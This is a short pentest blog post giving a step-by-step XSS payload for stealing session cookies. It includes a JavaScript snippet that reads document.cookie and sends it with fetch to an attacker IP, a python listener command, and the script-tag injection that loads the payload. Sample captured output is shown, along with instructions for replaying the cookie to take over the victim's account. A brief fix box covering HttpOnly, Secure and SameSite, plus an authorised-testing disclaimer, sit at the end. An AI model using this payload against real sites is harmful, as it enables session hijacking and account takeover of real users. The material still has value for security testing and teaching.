---
layout: single
title: "XSS — Stealing Session Cookies"
date: 2026-05-14
categories:
  - tools
  - payloads
  - xss
tags:
  - xss
  - cross-site-scripting
  - payloads
  - session-hijacking
  - cookie-theft
  - account-takeover
  - javascript
  - reflected-xss
  - stored-xss
  - web-application-pentest
  - owasp
  - owasp-a03-injection
  - owasp-a07-identification-authentication-failures
  - cwe-79
  - cwe-614
  - bugbounty
  - tools
author_profile: true
read_time: true
show_date: true
toc: true
toc_label: "Contents"
excerpt: "Use an XSS injection to exfiltrate the victim's session cookie to your server — achieving full account takeover without knowing their password."
header:
  teaser: /assets/images/Logo.png
---

<style>
.tool-cmd{background:#0a0a0a;border:1px solid #1e1e1e;border-left:3px solid #9fef00;border-radius:4px;padding:10px 14px;font-family:'Courier New',monospace;font-size:12px;color:#9fef00;margin:10px 0;white-space:pre-wrap;}
.tool-out{background:#0a0a0a;border:1px solid #1e1e1e;border-left:3px solid #4488ff;border-radius:4px;padding:10px 14px;font-family:'Courier New',monospace;font-size:11px;color:#888;margin:10px 0;white-space:pre-wrap;line-height:1.8;}
.remediation-box{background:#050d05;border:1px solid #9fef0022;border-radius:6px;padding:10px 14px;margin:16px 0;font-size:12px;color:#9fef0088;font-family:'Courier New',monospace;}
.remediation-box strong{color:#9fef00;}
table{width:100%;border-collapse:collapse;font-family:'Courier New',monospace;font-size:12px;margin:16px 0;}
th{background:#0a0a0a;color:#9fef00;padding:8px 12px;border:1px solid #1e1e1e;text-align:left;}
td{padding:8px 12px;border:1px solid #1e1e1e;color:#ccc;}
</style>

## The Attack

If `HttpOnly` is not set on session cookies, JavaScript can read them via `document.cookie`. This payload grabs the cookie and sends it to your server.

## Step-by-Step

**Step 1 — Create `xss.js` on your attack machine:**

```javascript
let cookie = document.cookie
let encodedCookie = encodeURIComponent(cookie)
fetch("http://192.168.XX.XX/exfil?data=" + encodedCookie)
```

**Step 2 — Start your listener:**

<div class="tool-cmd">python3 -m http.server 80</div>

**Step 3 — Submit the injection:**

```html
<script src="http://192.168.XX.XX/xss.js"></script>
```

## What You Receive

<div class="tool-out">GET /exfil?data=PHPSESSID%3Dabc123xyz456%3B%20other%3Dvalue HTTP/1.1</div>

Decode the URL-encoded string and you have the victim's raw session ID. Drop it into your browser via DevTools and you're authenticated as them.

## Impact

Full session takeover — access anything the victim can access: profile, saved payment methods, admin functions.

<div class="remediation-box"><strong>Fix:</strong> Set <code>HttpOnly</code> flag on all session cookies — this makes cookies inaccessible to JavaScript entirely. Also set <code>Secure</code> and <code>SameSite=Strict</code>.</div>

---

*All payloads documented for authorised security testing only. Do not use against systems without explicit written permission.*

<a href="https://buymeacoffee.com/sweshinfosec" target="_blank" style="font-family:monospace;font-size:13px;color:#9fef00;">&#9749; Buy Me a Coffee</a>
&nbsp;&nbsp;
<a href="https://www.patreon.com/c/SweshInfoSec" target="_blank" style="font-family:monospace;font-size:13px;color:#ff9800;">Patreon &rarr;</a>
